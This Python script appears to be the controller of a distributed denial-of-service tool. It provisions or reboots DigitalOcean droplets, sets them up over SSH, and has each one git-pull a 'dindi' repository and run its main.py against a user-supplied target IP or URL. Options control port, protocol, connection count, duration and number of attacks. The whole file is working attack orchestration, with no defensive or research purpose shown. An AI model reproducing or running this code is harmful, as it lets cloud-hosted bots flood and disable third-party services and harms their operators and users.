import DOManager
import ConfigsManager
import SSHCommandsList
import argparse
import time

def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-c', '--config', help='Path to config file', default='config.ini')
    parser.add_argument('-s', help='Target ip or url')
    parser.add_argument('-p', help='Target port', default=-1)
    parser.add_argument('-t', help='Specify connection counts per single attack', default=500)
    parser.add_argument('-m', help='Specify protocol', default='TCP')
    parser.add_argument('-d', help='Duration in seconds', default=60)
    parser.add_argument('-a', help='Number attacks', default=60)
    parser.add_argument('-r', help='Reinit droplets', action=argparse.BooleanOptionalAction, default=False)
    parser.add_argument('-rb', help='Reboot droplets', action=argparse.BooleanOptionalAction, default=False)
    
    opts=parser.parse_args()

    configs=ConfigsManager.ConfigsManager(opts.config)
    do_manager=DOManager.DOManager(configs)
    if opts.rb:
        do_manager.reboot_droplets()
        return

    do_manager=DOManager.DOManager(configs)
    if opts.r or do_manager.is_need_init_droplets():
        if do_manager.init_droplets() != True:
            print('Failed initialize droplets...')
            return

        time.sleep(15)

        setup_ssh_commands=SSHCommandsList.SSHCommandsList(configs.get_ssh_commands())
        for i in range(0, do_manager.get_droplets_count()):
            do_manager.execute_commands(i, setup_ssh_commands, True)

    attack_command_str='cd dindi && git pull && python3 ./main.py -s ' + opts.s + ' -p ' + opts.p + ' -t ' + opts.t + ' -m ' + opts.m + ' -d ' + opts.d + ' -a ' + opts.a
    attack_ssh_commands=SSHCommandsList.SSHCommandsList(attack_command_str)
    for i in range(0, do_manager.get_droplets_count()):
        do_manager.execute_commands(i, attack_ssh_commands, False)
    do_manager.wait() 

if __name__=='__main__':
    main()